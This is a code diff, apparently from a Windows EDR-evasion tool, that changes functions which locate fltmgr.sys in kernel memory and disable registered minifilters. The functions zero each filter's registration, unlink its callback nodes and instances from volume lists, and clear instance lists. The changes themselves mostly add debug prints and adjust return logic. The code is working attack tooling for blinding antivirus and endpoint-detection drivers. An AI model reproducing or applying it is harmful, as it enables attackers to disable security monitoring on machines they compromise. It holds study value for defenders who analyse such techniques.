@@ -59,9 +59,10 @@ TCHAR const* WIN_FILTERS[] = {
 };
 
 TCHAR const* FLTMGR_DRIVER = _T("fltmgr.sys");
-DWORD64 BaseAddr = NULL;
+DWORD64 BaseAddr = 0;
 
 BOOL EnumFilters(const DWORD64 FLTP_FRAME) {
+  BOOL found = FALSE;
   DWORD64 FLT_FILTER_head = FLTP_FRAME + g_fltmgrOffsets[FLTOS_FLTP_FRAME__RegisteredFilters] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
 
   for(
@@ -81,20 +82,22 @@ BOOL EnumFilters(const DWORD64 FLTP_FRAME) {
     DWORD64 pRegistration = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Registration];
     const DWORD64 Registration = ReadMemoryDWORD64(pRegistration);
     if (Registration == 0) {
+      _tprintf_or_not(TEXT("[+] Cleared\n"));
       continue;
     }
-    return TRUE;
+    found |= TRUE;
   }
 
-  return FALSE;
+  return found;
 }
 
 BOOL EnumMinifilterCallbacks() {
+  BOOL found = FALSE;
   if (!FltmgrOffsetsArePresent()) {
     _putts_or_not(TEXT("FltMgr offsets not loaded ! Aborting..."));
     return FALSE;
   }
-  DebugBreak();
+// DebugBreak();
 
   BaseAddr = FindDriverBaseAddress(FLTMGR_DRIVER);
   if (BaseAddr == 0) {
@@ -110,16 +113,14 @@ BOOL EnumMinifilterCallbacks() {
       FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__Links)
      ) {
     const DWORD64 FLTP_FRAME = FLTP_FRAME__Links - g_fltmgrOffsets[FLTOS_FLTP_FRAME__Links];
-    if (EnumFilters(FLTP_FRAME)) {
-      return TRUE;
-    }
+    found |= EnumFilters(FLTP_FRAME);
   }
 
-  return FALSE;
+  return found;
 }
 
 
-BOOL DisableFilters(const DWORD64 FLTP_FRAME) {
+void DisableFilters(const DWORD64 FLTP_FRAME) {
   DWORD64 FLT_FILTER_head = FLTP_FRAME + g_fltmgrOffsets[FLTOS_FLTP_FRAME__RegisteredFilters] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
 
   for(
@@ -139,14 +140,17 @@ BOOL DisableFilters(const DWORD64 FLTP_FRAME) {
     DWORD64 pRegistration = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Registration];
     const DWORD64 Registration = ReadMemoryDWORD64(pRegistration);
     if (Registration == 0) {
+      _tprintf_or_not(TEXT("[+] No Registration\n"));
       continue;
     }
+// DebugBreak();
+    _tprintf_or_not(TEXT("[+] Patch Registration at %llx\n"), pRegistration);
     Patch(pRegistration, 0);
 
     DWORD64 FLT_INSTANCE_head = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
     DWORD count = ReadMemoryDWORD(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rCount]);
     if (count == 0) {
-      _tprintf_or_not(TEXT("[+] Clean\n"));
+      _tprintf_or_not(TEXT("[+] Instances Clean\n"));
       continue;
     }
 
@@ -156,17 +160,20 @@ BOOL DisableFilters(const DWORD64 FLTP_FRAME) {
         FLT_INSTANCE__FilterLink = ReadMemoryDWORD64(FLT_INSTANCE__FilterLink)
        ) {
       DWORD64 FLT_INSTANCE = FLT_INSTANCE__FilterLink - g_fltmgrOffsets[FLTOS_FLT_INSTANCE__FilterLink];
+      _tprintf_or_not(TEXT("[+] Process instance at %llx\n"), FLT_INSTANCE);
 
-      // Remove from volume's Callbacks
+      // 
+      _tprintf_or_not(TEXT("[+] Remove from volume's Callbacks\n"));
       const DWORD64 CallbackNodes = FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__CallbackNodes];
       for (int i = 0; i < 0x32; i++) {
         DWORD64 CallbackNode = ReadMemoryDWORD64(CallbackNodes + sizeof(PVOID) * i);
         if (!CallbackNode) continue;
 
+        _tprintf_or_not(TEXT("[+] Callback NO. %d\n at CallbackNode %llx"), i, CallbackNode);
         removeDoubleLinkedNode(CallbackNode);
       }
 
-      // Remove from volume's instance list
+      _tprintf_or_not(TEXT("[+] Remove from volume's instance list\n"));
       DWORD64 FLT_VOLUME = ReadMemoryDWORD64(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__Volume]);
       DWORD64 pFLT_VOLUME_InstanceList_count = FLT_VOLUME + g_fltmgrOffsets[FLTOS_FLT_VOLUME__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rCount];
       DWORD countVol = ReadMemoryDWORD(pFLT_VOLUME_InstanceList_count);
@@ -175,7 +182,7 @@ BOOL DisableFilters(const DWORD64 FLTP_FRAME) {
       removeDoubleLinkedNode(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink]);
     }
 
-    // Clear instance list from this driver
+    _tprintf_or_not(TEXT("[+] Clear instance list from this driver\n"));
     Patch(FLT_INSTANCE_head, FLT_INSTANCE_head);
     Patch(FLT_INSTANCE_head + 8, FLT_INSTANCE_head);
     PatchSize(FLT_INSTANCE_head + 16, (Value){ .dword = 0 }, S4);
@@ -184,7 +191,6 @@ BOOL DisableFilters(const DWORD64 FLTP_FRAME) {
 
 void DisableMinifilterCallbacks() {
   _tprintf_or_not(TEXT("[+] [MinifilterCallblacks] Disabling...\n"));
-  DebugBreak();
 
   const DWORD64 FLTP_FRAME__head = BaseAddr + g_fltmgrOffsets[FLTOS_FltGlobals] + g_fltmgrOffsets[FLTOS_GLOBALS__FrameList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
   for(
